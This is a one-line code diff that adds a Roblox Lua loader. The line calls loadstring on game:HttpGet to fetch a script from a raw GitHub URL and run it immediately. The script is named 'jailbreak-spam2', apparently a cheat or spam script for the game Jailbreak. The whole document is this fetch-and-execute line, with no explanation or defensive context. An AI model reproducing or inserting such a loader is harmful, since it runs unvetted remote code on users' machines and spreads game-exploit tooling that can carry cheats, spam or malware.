@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/jailbreak-spam2-m5ygbo1jo29xtw.lua"))()
